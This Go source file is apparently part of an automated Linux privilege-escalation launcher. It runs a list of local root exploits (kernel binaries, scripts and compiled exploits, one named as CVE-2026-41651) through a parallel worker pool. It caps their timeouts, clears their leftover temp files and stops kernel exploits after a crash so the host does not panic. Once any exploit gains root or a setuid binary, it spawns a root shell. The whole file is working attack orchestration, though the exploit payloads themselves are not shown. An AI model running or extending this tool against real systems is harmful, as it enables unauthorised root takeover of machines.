package main

import (
	"context"
	"flag"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// flagJobs controls how many exploits run in parallel.
var flagJobs = flag.Int("jobs", 0, "Parallel exploit workers (default: auto = NumCPU, cap 8)")

// workerCount returns the concurrency level.
func workerCount() int {
	j := *flagJobs
	if j < 1 {
		j = runtime.NumCPU()
	}
	if j > 8 {
		j = 8
	}
	if j < 1 {
		j = 1
	}
	return j
}

// runPool executes a batch of exploits concurrently with a worker pool.
// It returns the moment ANY worker achieves root (context cancellation
// stops all other workers), or when all are done.
//
// stop is set to true if root was achieved.
// shellSpawned is set via the spawnOnce guard.
func runPool(ctx context.Context, s *systemInfo, exploits []Exploit, stop *bool, wg *sync.WaitGroup) {
	jobs := make(chan Exploit)
	n := workerCount()
	if n > len(exploits) {
		n = len(exploits)
	}
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for e := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
				}
				if *stop {
					return
				}
				runOneConcurrent(ctx, s, e, stop)
			}
		}()
	}
	for _, e := range exploits {
		if *stop {
			break
		}
		select {
		case <-ctx.Done():
			// `break` inside a select only exits the select, not the for
			// loop — use a labeled break via goto to avoid spinning.
			goto done
		case jobs <- e:
		}
	}
done:
	close(jobs)
}

// crashedKernel is set once a kernel exploit (kindBinary) dies with a
// hard crash signal (SIGSEGV/SIGABRT/SIGBUS). Once set, all remaining
// kernel-binary exploits are skipped: a NULL-deref or double-free in a
// kernel exploit can destabilize/panic the host, and running more
// exploits of the same kind on an already-wounded kernel multiplies the
// damage (especially under parallel workers). ulimit cannot prevent
// this — it only caps user-space resources, not kernel-side faults.
var crashedKernel atomic.Bool

// runOneConcurrent is the concurrency-safe version of runOne.
func runOneConcurrent(ctx context.Context, s *systemInfo, e Exploit, stop *bool) {
	// Crash backoff: if a previous kernel exploit SIGSEGV'd, the kernel
	// may be destabilized. Skip remaining kernel-binary exploits rather
	// than hammering the same bug and risking a full panic.
	if crashedKernel.Load() && e.Kind == kindBinary {
		stepf("%-26s skip (kernel destabilized by previous crash)", e.Name)
		return
	}
	if e.NoRoot {
		return
	}
	if !e.exists() {
		stepf("%-26s skip (file missing)", e.Name)
		return
	}
	if ok, why := e.eligible(s); !ok {
		if *flagOnlyKern && strings.Contains(why, "kernel") {
			stepf("%-26s skip (%s)", e.Name, why)
			return
		}
		if strings.Contains(why, "missing tools") {
			stepf("%-26s skip (%s)", e.Name, why)
			return
		}
	}
	if *flagDry {
		stepf("%-26s DRY  would run (%s)", e.Name, e.Desc)
		return
	}

	to := e.Timeout
	if to == 0 {
		to = defaultTimeout
	}
	// Cap at 30s in concurrent mode (was 45s) to keep the pool moving.
	// Cap unconditionally — 120s exploits (2025mod, CVE-2026-41651) were
	// bypassing the cap because the old `< 120` let them through.
	if to > 30 {
		to = 30
	}

	// Clean temp files this single-use exploit would choke on. Many
	// exploits fail with "loader drop failed" / "helper drop failed" if
	// their temp files already exist from a previous run.
	cleanupExploit(&e)

	stepf("%-26s running... (%s)", e.Name, e.Desc)

	var r runResult
	switch e.Kind {
	case kindBinary:
		argv, _ := e.buildArgv()
		r = runIsolated(e.Name, "", argv, time.Duration(to)*time.Second)
	case kindScript:
		argv, _ := e.buildArgv()
		r = runIsolated(e.Name, "", argv, time.Duration(to)*time.Second)
	case kindCompile:
		r = compileAndRun(e, s)
	case kindDir:
		r = compileAndRun(e, s)
	case kindCopyfail:
		argv, _ := e.buildArgv()
		r = runIsolated(e.Name, "", argv, time.Duration(to)*time.Second)
	}
	r.name = e.Name
	r.report()
	if *flagVerbose {
		printChildOutput(&r)
	}
	// Crash backoff: a kernel exploit that died with a hard crash signal
	// (SIGSEGV/SIGABRT/SIGBUS) likely hit a NULL-deref or double-free in
	// the kernel. Set the flag so remaining kernel-binary exploits are
	// skipped — the kernel may already be destabilized and another hit
	// of the same bug can panic the box.
	if r.crashed && e.Kind == kindBinary &&
		(r.signal == "segmentation fault" || r.signal == "aborted" || r.signal == "bus error") {
		warnf("%s crashed with %s — skipping remaining kernel exploits", e.Name, r.signal)
		crashedKernel.Store(true)
	}
	if r.rootAfter || r.suidAfter {
		spawnOnce(s, &r, stop)
	}
}

// spawnOnce ensures rootspawn is called exactly once across all workers.
var (
	spawnMu sync.Mutex
	spawned bool
)

func spawnOnce(s *systemInfo, r *runResult, stop *bool) {
	spawnMu.Lock()
	defer spawnMu.Unlock()
	if spawned {
		*stop = true
		return
	}
	if !*flagNoSpawn {
		shellSpawned.Store(rootspawn(r))
	}
	spawned = true
	*stop = true
}
